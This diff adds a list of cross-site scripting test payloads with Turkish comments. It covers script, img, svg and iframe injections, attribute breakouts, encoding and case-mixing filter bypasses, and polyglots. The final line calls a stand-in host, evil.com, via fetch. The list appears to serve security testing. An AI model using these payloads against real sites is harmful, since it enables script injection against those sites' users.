@@ -1,0 +1,52 @@
+# xss test payloadları
+# temel payloadlar
+<script>alert('XSS')</script>
+<script>alert(1)</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+
+# img etiketleri
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(1)>
+<img/src=x onerror=alert('XSS')>
+<img src=x onerror="alert('XSS')">
+
+# svg etiketleri
+<svg onload=alert('XSS')>
+<svg/onload=alert('XSS')>
+<svg onload="alert('XSS')">
+
+# attribute breakout
+"><script>alert('XSS')</script>
+'><script>alert('XSS')</script>
+"><img src=x onerror=alert('XSS')>
+'><img src=x onerror=alert('XSS')>
+" onfocus=alert('XSS') autofocus="
+' onfocus=alert('XSS') autofocus='
+
+# event handler'lar
+<body onload=alert('XSS')>
+<input onfocus=alert('XSS') autofocus>
+<marquee onstart=alert('XSS')>
+<details open ontoggle=alert('XSS')>
+<video src=x onerror=alert('XSS')>
+<audio src=x onerror=alert('XSS')>
+
+# encoding bypass
+%3Cscript%3Ealert('XSS')%3C/script%3E
+&#60;script&#62;alert('XSS')&#60;/script&#62;
+<scr<script>ipt>alert('XSS')</scr</script>ipt>
+<SCRIPT>alert('XSS')</SCRIPT>
+<ScRiPt>alert('XSS')</ScRiPt>
+
+# iframe
+<iframe src="javascript:alert('XSS')">
+<iframe onload=alert('XSS')>
+
+# polyglot XSS
+jaVasCript:/*-->*/<svg/onload='/* Wait */alert(1)'>
+"';alert(1)//
+';alert(1)//
+"-alert(1)-"
+'-alert(1)-'
+<svg/onload=fetch('//evil.com')>
+
